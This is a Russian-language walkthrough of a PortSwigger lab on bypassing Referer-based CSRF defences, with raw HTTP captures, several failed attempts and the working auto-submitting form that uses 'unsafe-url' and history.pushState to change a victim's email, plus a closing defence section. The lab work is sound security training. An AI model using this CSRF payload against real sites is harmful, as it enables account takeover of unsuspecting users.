Помимо средств защиты, использующих токены CSRF, некоторые приложения используют заголовок HTTP Refererer для защиты от атак CSRF, обычно путем проверки того, что запрос был отправлен из собственного домена приложения. Этот подход, как правило, менее эффективен и его часто можно обойти.

сервер проверяет заголовок Referer и убеждается что запрос пришел с его же домена

### как это обойти-

#### Referer не обязателен

если проверка пропускается когда Referer отсутствует - убиваем заголовок

```html
<meta name="referrer" content="never">
```
#### наивная валидация

проверка что домен начинается с expected или содержит его

можно зарегистрировать `vulnerable-site.com.attacker.com` или добавить в параметры `?vulnerable-site.com`

но современные браузеры режут Referer поэтому нужно форсировать через:
```html
<meta name="referrer" content="unsafe-url">


```


-----



лаба https://portswigger.net/web-security/csrf/bypassing-referer-based-defenses/lab-referer-validation-broken

задача - через CSRF-атаку сменить емейл адрес

-----

вот запрос на смену емейл

```http
POST /my-account/change-email HTTP/2
Host: 0a04009804aa9d2b805a0d95008a0068.web-security-academy.net
Cookie: session=Pkx7yFLvZdkgVV65B9zpuZVa9FsQqBdG
Content-Length: 20
Cache-Control: max-age=0
Sec-Ch-Ua: "Chromium";v="145", "Not:A-Brand";v="99"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "macOS"
Accept-Language: ru-RU,ru;q=0.9
Origin: https://0a04009804aa9d2b805a0d95008a0068.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://0a04009804aa9d2b805a0d95008a0068.web-security-academy.net/my-account?id=wiener
Accept-Encoding: gzip, deflate, br
Priority: u=0, i

email=hacker%40bk.ru
```

через гет сменить не вышло
GET /my-account/change-email?email=hacker%40bk.ru HTTP/2

-----

еду сюды
https://csrf-poc-generator.vercel.app

получаю за 1 сек
```html
<html>
  <body>
    <form action="https://0a04009804aa9d2b805a0d95008a0068.web-security-academy.net/my-account/change-email" method="POST">
      <input type="hidden" name="email" value="hacker@bk.ru" />
    </form>
    <script>
      document.forms[0].submit()
    </script>
  </body>
</html>
```

закидываю на сервер и сам перехожу!

не получилось самому себе сменить емейл!

смотрим запрос и ошибку

```http
POST /my-account/change-email HTTP/2
Host: 0a04009804aa9d2b805a0d95008a0068.web-security-academy.net
Cookie: session=Pkx7yFLvZdkgVV65B9zpuZVa9FsQqBdG
Content-Length: 22
Cache-Control: max-age=0
Sec-Ch-Ua: "Chromium";v="145", "Not:A-Brand";v="99"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "macOS"
Accept-Language: ru-RU,ru;q=0.9
Origin: https://exploit-0a030093042a9dbc80da0cd301c500f9.exploit-server.net
Content-Type: application/x-www-form-urlencoded
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: cross-site
Sec-Fetch-Mode: navigate
Sec-Fetch-Dest: document
Referer: https://exploit-0a030093042a9dbc80da0cd301c500f9.exploit-server.net/
Accept-Encoding: gzip, deflate, br
Priority: u=0, i

email=hacker44%40bk.ru
```

ответ
```http
HTTP/2 400 Bad Request
Content-Type: application/json; charset=utf-8
X-Frame-Options: SAMEORIGIN
Content-Length: 24

"Invalid referer header"
```

ему не нравится , что запрос вернулся от  моего https://exploit-0a03....

------


пробую убрать рефер
так 
```html
<html>
  <body>
    <form action="https://0a04009804aa9d2b805a0d95008a0068.web-security-academy.net/my-account/change-email" method="POST">
      <input type="hidden" name="email" value="hacker@bk.ru" />
      <meta name="referrer" content="no-referrer">
    </form>
    <script>
      document.forms[0].submit()
    </script>
  </body>
</html>
```
или так
```html
<html>
  <body>
    <form action="https://0a04009804aa9d2b805a0d95008a0068.web-security-academy.net/my-account/change-email" method="POST">
      <input type="hidden" name="email" value="hacker@bk.ru" />
      <meta name="referrer" content="never">
    </form>
    <script>
      document.forms[0].submit()
    </script>
  </body>
</html>
```

оба варианта дали ответ 400 "Invalid referer header"

-----

нужно пробовать задурить этот рефер так, чтобы там остался и оригинальный рефер

-----

вот ориг рефер которому сервер доверяет
Referer: https://0a04009804aa9d2b805a0d95008a0068.web-security-academy.net/my-account?id=wiener

вот мой эксплойт сервер
Referer: https://exploit-0a030093042a9dbc80da0cd301c500f9.exploit-server.net/


нужно скомбинровать их

------

пробую так 
```http

https://exploit-0a030093042a9dbc80da0cd301c500f9.exploit-server.net/csrf-attack?web-security-academy.net/my-account?id=wiener

https://exploit-0a030093042a9dbc80da0cd301c500f9.exploit-server.net/web-security-academy.net/my-account?id=wiener


https://exploit-0a030093042a9dbc80da0cd301c500f9.exploit-server.net/?0a04009804aa9d2b805a0d95008a0068.web-security-academy.net/

не работает
```

пробую добавить Referrer-Policy: unsafe-url

```html
<html>
  <body>
    <form action="https://0a04009804aa9d2b805a0d95008a0068.web-security-academy.net/my-account/change-email" method="POST">
      <input type="hidden" name="email" value="hacker@bk.ru" />
      <meta name="referrer" content="never" referrer-Policy: "unsafe-url">
    </form>
    <script>
      document.forms[0].submit()
    </script>
  </body>
</html>
```

не работает

------

пробую так
 `<meta name="referrer" content="unsafe-url">`


```html
<html>
  <body>
    <form action="https://0a04009804aa9d2b805a0d95008a0068.web-security-academy.net/my-account/change-email" method="POST">
      <input type="hidden" name="email" value="hacker@bk.ru" />
      <meta name="referrer" content="unsafe-url">
    </form>
    <script>
      document.forms[0].submit()
    </script>
  </body>
</html>
```
нет
```html
<html>
  <head>
    <meta name="referrer" content="unsafe-url">
  </head>
  <body>
    <form action="https://0a04009804aa9d2b805a0d95008a0068.web-security-academy.net/my-account/change-email" method="POST">
      <input type="hidden" name="email" value="hacker@bk.ru" />
    </form>
    <script>
      document.forms[0].submit()
    </script>
  </body>
</html>
```

нет

запрос вот такой выходит
```http
POST / HTTP/2
Host: exploit-0a030093042a9dbc80da0cd301c500f9.exploit-server.net
Content-Length: 719
Cache-Control: max-age=0
Sec-Ch-Ua: "Chromium";v="145", "Not:A-Brand";v="99"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "macOS"
Accept-Language: ru-RU,ru;q=0.9
Origin: https://exploit-0a030093042a9dbc80da0cd301c500f9.exploit-server.net
Content-Type: application/x-www-form-urlencoded
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://exploit-0a030093042a9dbc80da0cd301c500f9.exploit-server.net/?0a04009804aa9d2b805a0d95008a0068.web-security-academy.net/
Accept-Encoding: gzip, deflate, br
Priority: u=0, i

urlIsHttps=on&responseFile=%2F%3F0a04009804aa9d2b805a0d95008a0068.web-security-academy.net%2F&responseHead=HTTP%2F1.1+200+OK%0D%0AContent-Type%3A+text%2Fhtml%3B+charset%3Dutf-8&responseBody=%3Chtml%3E%0D%0A++%3Cbody%3E%0D%0A++++%3Cform+action%3D%22https%3A%2F%2F0a04009804aa9d2b805a0d95008a0068.web-security-academy.net%2Fmy-account%2Fchange-email%22+method%3D%22POST%22%3E%0D%0A++++++%3Cinput+type%3D%22hidden%22+name%3D%22email%22+value%3D%22hacker%40bk.ru%22+%2F%3E%0D%0A++++++%3Cmeta+name%3D%22referrer%22+content%3D%22unsafe-url%22%3E%0D%0A++++%3C%2Fform%3E%0D%0A++++%3Cscript%3E%0D%0A++++++document.forms%5B0%5D.submit%28%29%0D%0A++++%3C%2Fscript%3E%0D%0A++%3C%2Fbody%3E%0D%0A%3C%2Fhtml%3E&formAction=VIEW_EXPLOIT
```
 
и ответ 302 c отражением двух url (мой и оригинальный)
```http
HTTP/2 302 Found
Location: https://exploit-0a030093042a9dbc80da0cd301c500f9.exploit-server.net/?0a04009804aa9d2b805a0d95008a0068.web-security-academy.net/
Server: Academy Exploit Server
Content-Length: 0

```

и вот запрос 
```http
GET /?0a04009804aa9d2b805a0d95008a0068.web-security-academy.net/ HTTP/2
Host: exploit-0a030093042a9dbc80da0cd301c500f9.exploit-server.net
Cache-Control: max-age=0
Accept-Language: ru-RU,ru;q=0.9
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Sec-Ch-Ua: "Chromium";v="145", "Not:A-Brand";v="99"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "macOS"
Referer: https://exploit-0a030093042a9dbc80da0cd301c500f9.exploit-server.net/?0a04009804aa9d2b805a0d95008a0068.web-security-academy.net/
Accept-Encoding: gzip, deflate, br
Priority: u=0, i


```

но ответ почему -то 200 обратно на мой эксплойт сервер а не на смену емейл - но хотябы нет блока по реферу
```html
HTTP/2 200 OK
Content-Type: text/html; charset=utf-8
Server: Academy Exploit Server
Content-Length: 6551

<!DOCTYPE html>
<html>
    <head>
        <link href=/resources/labheader/css/academyLabHeader.css rel=stylesheet>
        <link href="/resources/css/labsDark.css" rel="stylesheet">
        <title>Exploit Server: CSRF with broken Referer validation</title>
    </head>
    <body>
        <div class="is-dark">
            <script src="/resources/labheader/js/labHeader.js"></script>
            <!--LAB_HEADER_START-->
            <div id="academyLabHeader">
                <section class='academyLabBanner'>
                    <div class=container>
                        <div class=logo></div>
                            <div class=title-container>
                                <h2>CSRF with broken Referer validation</h2>
                                <a id='lab-link' class='button' href='https://0a04009804aa9d2b805a0d95008a0068.web-security-academy.net'>Back to lab</a>
                                <a class=link-back href='https://portswigger.net/web-security/csrf/bypassing-referer-based-defenses/lab-referer-validation-broken'>
                                    Back&nbsp;to&nbsp;lab&nbsp;description&nbsp;
                                    <svg version=1.1 id=Layer_1 xmlns='http://www.w3.org/2000/svg' xmlns:xlink='http://www.w3.org/1999/xlink' x=0px y=0px viewBox='0 0 28 30' enable-background='new 0 0 28 30' xml:space=preserve title=back-arrow>
                                        <g>
                                            <polygon points='1.4,0 0,1.2 12.6,15 0,28.8 1.4,30 15.1,15'></polygon>
                                            <polygon points='14.3,0 12.9,1.2 25.6,15 12.9,28.8 14.3,30 28,15'></polygon>
                                        </g>
                                    </svg>
                                </a>
                            </div>
                            <div class='widgetcontainer-lab-status is-notsolved'>
                                <span>LAB</span>
                                <p>Not solved</p>
                                <span class=lab-status-icon></span>
                            </div>
                        </div>
                    </div>
                </section>
            </div>
            <!--LAB_HEADER_END-->
            <section class="maincontainer is-page">
                <div class="container">
                    <div class="information">
                        <p>This is your server. You can use the form below to save an exploit, and send it to the victim.</p>
                        <p>Please note that the victim uses Google Chrome. When you test your exploit against yourself, we recommend using Burp's Browser or Chrome.</h3>
                    </div>
                    <h3>Craft a response</h3>
                        <form id=feedbackForm action="/" method="POST" style="max-width: unset">
                            <p>URL: <span id=fullUrl></span></p>
                            <label>HTTPS</label>
                            <input type="checkbox" style="width: auto" name="urlIsHttps" checked onchange='updateFullUrl()' />
                            <label>File:</label>
                            <input required type="text" name="responseFile" value="/?0a04009804aa9d2b805a0d95008a0068.web-security-academy.net/" oninput='updateFullUrl()' />
                            <label>Head:</label>
                            <textarea required rows="12" cols="300" name="responseHead">HTTP/1.1 200 OK
Content-Type: text/html; charset=utf-8</textarea>
                            <label>Body:</label>
                            <textarea required rows="12" cols="300" style="white-space: no-wrap; overflow-x: scroll" name="responseBody">&lt;html&gt;
  &lt;body&gt;
    &lt;form action=&quot;https://0a04009804aa9d2b805a0d95008a0068.web-security-academy.net/my-account/change-email&quot; method=&quot;POST&quot;&gt;
      &lt;input type=&quot;hidden&quot; name=&quot;email&quot; value=&quot;hacker@bk.ru&quot; /&gt;
      &lt;meta name=&quot;referrer&quot; content=&quot;unsafe-url&quot;&gt;
    &lt;/form&gt;
    &lt;script&gt;
      document.forms[0].submit()
    &lt;/script&gt;
  &lt;/body&gt;
&lt;/html&gt;</textarea>
                            <button class="button" name="formAction" value="STORE" type="submit">
                                Store
                            </button>
                            <button class="button" name="formAction" value="VIEW_EXPLOIT" type="submit">
                                View exploit
                            </button>
                            <button class="button" name="formAction" value="DELIVER_TO_VICTIM" type="submit">
                                Deliver exploit to victim
                            </button>
                            <button class="button" name="formAction" value="ACCESS_LOG" type="submit">
                                Access log
                            </button>
                        </form>
                        <script>
                            const convertFormToJson = (node) => Array.from(node.querySelectorAll('input, textarea, select'))
                                .reduce((acc, cur) => {
                                    acc[cur.name] = cur.type === 'checkbox'
                                        ? cur.checked
                                        : cur.value;
                                    return acc;
                                    }, {})

                            const updateFullUrl = () => {
                                const o = convertFormToJson(document.getElementById('feedbackForm'));
                                const target = document.getElementById('fullUrl');
                                const hostname = 'exploit-0a030093042a9dbc80da0cd301c500f9.exploit-server.net';
                                const responseFileParameterKey = 'responseFile';
                                const urlIsHttpsParameterKey = 'urlIsHttps';
                                const tls = o[urlIsHttpsParameterKey];
                                let url = tls ? 'https' : 'http';
                                url += '://';
                                url += hostname;
                                url += o[responseFileParameterKey];
                                target.textContent = url;
                            };

                            updateFullUrl();
                        </script>
                    <br>
                </div>
            </section>
        </div>
    </body>
</html>

```

короче не помогает ничего - хотя я вижу в рефере оба домена

-----

вот из офиц решения 

```html
<html>
  <head>
    <meta name="referrer" content="unsafe-url">
  </head>
  <body>
    <form action="https://0a04009804aa9d2b805a0d95008a0068.web-security-academy.net/my-account/change-email" method="POST">
      <input type="hidden" name="email" value="hacker@bk.ru" />
    </form>
    <script>
      history.pushState('', '', '/?0a04009804aa9d2b805a0d95008a0068.web-security-academy.net');
      document.forms[0].submit();
    </script>
  </body>
</html>
```

сработало! емейл сменился!

-------

ЛАБА РЕШЕНА !!!!!!

все почти как у меня - но здесь добавили  history.pushState

- `history.pushState` меняет URL текущей страницы на `/?0a04009804aa9d2b805a0d95008a0068.web-security-academy.net` без перезагрузки
- `unsafe-url` заставляет браузер отправить полный URL включая query string в referer

сервер видит в referer свой домен как подстроку и пропускает запрос


------
--------
---------

### выводы

в этой лабе защита от csrf снова строилась на проверке заголовка referer

сервер ожидал что в referer будет содержаться его домен, но валидация оказалась слишком наивной - он просто проверял наличие подстроки с доменом где угодно в строке referer

когда я отправлял форму со своего эксплойт-сервера, referer указывал на мой домен и сервер отвечал ошибкой

убрать referer через meta name="referrer" content="no-referrer" не получилось - сервер требовал его присутствия

тогда я добавил meta name="referrer" content="unsafe-url" в head страницы  и с помощью history.pushState (подсмотрел решение) и изменил URL текущей страницы добавив в него домен уязвимого сайта как query параметр

в итоге referer стал выглядеть как мой эксплойт-сервер но с добавленным доменом жертвы в конце

сервер увидел знакомую подстроку и пропустил запрос

### защита

чтобы защититься от таких атак нужно строго проверять referer  - 

убеждаться что он начинается с ожидаемого протокола и домена и заканчивается слешем

нельзя полагаться на частичное совпадение или наличие подстроки где-либо в заголовке

лучше всего вообще не использовать referer для защиты от csrf, а применять уникальные csrf-токены которые привязаны к сессии пользователя и проверяются на сервере

если по каким-то причинам приходится использовать referer - всегда проверять его наличие и точное соответствие, а также учитывай что современные браузеры могут обрезать query string поэтому используй строгую проверку origin
